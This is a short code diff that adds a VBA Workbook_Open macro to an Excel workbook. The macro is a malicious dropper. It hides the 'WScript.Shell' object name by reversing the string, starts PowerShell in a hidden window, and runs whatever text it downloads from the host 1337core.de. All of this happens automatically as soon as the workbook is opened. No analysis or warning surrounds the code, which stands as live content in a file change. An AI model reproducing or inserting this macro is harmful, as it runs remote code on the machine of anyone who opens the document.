@@ -1,0 +1,3 @@
+Private Sub Workbook_Open()
+CreateObject(StrReverse("llehS.tpirCSW")).Run ("poweRshell.exe -windowstyle hidden -Command pOwershell.exe -Command (Invoke-WebRequest -Uri https://www.1337core.de/powershell.html).ParsedHtml.body.innerText")
+End Sub
